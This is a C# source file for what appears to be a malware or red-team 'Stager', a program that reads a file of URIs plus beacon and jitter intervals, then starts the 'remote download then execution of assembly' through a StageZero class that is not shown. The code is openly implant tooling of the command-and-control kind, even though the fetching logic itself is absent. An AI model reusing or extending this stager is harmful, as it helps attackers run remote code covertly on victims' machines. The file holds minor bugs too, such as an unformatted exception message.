#define DEBUG
//#define LOCAL_LOAD
#define REMOTE_LOAD

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;

namespace Stager
{
    class Program
    {
        static FileInfo uris;
        static Dictionary<string, string> arguments;
        static void Main(string[] args)
        {
            try
            {
                arguments = ParseArgs(args);
                if (File.Exists(arguments["file"]))
                    uris = new FileInfo(arguments["file"]);
                else
                    uris = new FileInfo("uris.txt");

                Console.WriteLine("\n[*] Starting remote download then execution of assembly");
                StageZero stage = new StageZero(uris, Int32.Parse(arguments["beacon"]), Int32.Parse(arguments["jitter"]));
            }
            catch(ArgumentException e)
            {
                Console.WriteLine(e.Message);
            }
        }
        /// <summary>
        /// Parses the arguments that should be supplied to the terminal server.
        /// Throws ArgumentException if the supplied arguments are not correct
        /// </summary>
        /// <param name="args">Arguments supplied to the program</param>
        /// <returns>Dictionary storing the arguments</returns>
        private static Dictionary<string, string> ParseArgs(string[] args)
        {
            Dictionary<string, string> arguments = new Dictionary<string, string>();
            Regex allFlags = new Regex("^--file|^--beacon|^--jitter");
            Regex file = new Regex("^--file");
            Regex beacon = new Regex("^--beacon");
            Regex jitter = new Regex("^--jitter");
            int numArgs = args.Length;
            for (int i = 0; i < numArgs; i++)
            {
                // Check if it has a flag we're expecting
                if (!allFlags.IsMatch(args[i]) && i % 2 == 0)   // Make sure even number args are the flags we expect
                    throw new ArgumentException("Using invalid flag: {0}", args[i]);
                else if (file.IsMatch(args[i]) && i < numArgs - 1)
                {
                    if (File.Exists(args[i+1]))
                        arguments["file"] = args[i + 1];
                    else
                        throw new ArgumentException("URI file provided does not exist");
                    i++;
                }
                else if (beacon.IsMatch(args[i]) && i < numArgs - 1)
                {
                    int test;
                    if (Int32.TryParse(args[i + 1], out test))
                        arguments["beacon"] = args[i + 1];
                    else
                        throw new ArgumentException("Beacon provided is not an integer");
                    i++;
                }
                else if (jitter.IsMatch(args[i]) && i < numArgs - 1)
                {
                    int test;
                    if (Int32.TryParse(args[i + 1], out test))
                        arguments["jitter"] = args[i + 1];
                    else
                        throw new ArgumentException("Jitter provided is not an integer");
                    i++;
                }
            }
            return arguments;
        }
    }
}
